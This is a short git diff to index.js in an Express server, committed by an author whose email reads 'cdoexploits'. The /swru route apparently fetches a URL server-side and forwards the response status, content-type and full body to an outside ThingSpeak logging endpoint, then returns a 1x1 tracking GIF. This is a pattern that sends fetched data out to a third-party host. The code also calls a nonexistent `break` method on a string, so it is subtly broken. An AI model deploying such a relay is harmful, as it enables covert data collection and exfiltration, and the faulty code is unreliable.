aada94c4d096ea188db17750a1f174de807cd1bb
Danish Syed <cdoexploits@proton.me>
2024-04-12 11:59:05 -0500

    1.2.3

--- index.js
+++ index.js
@@ -55,7 +55,7 @@ app.get("/swru", async (req,res)=>{
 		let userid = query.userid;
 		let request = await axios.get(site);
 			ctype = request.headers["content-type"]
-			console.log(typeof ctype);
+			console.log("CTYPE", ctype);
 			axios.get(`https://api.thingspeak.com/update?api_key=${apikey}&field1=${encodeURIComponent(`${"swru"+userid}\\${encodeURIComponent(`${request.status}\\${ctype.break(";")[0]}\\${request.headers["content-type"].includes("application")?JSON.stringify(request.data):request.data}`)}`)}`);
 			res.sendFile("1x1.gif",root);
 
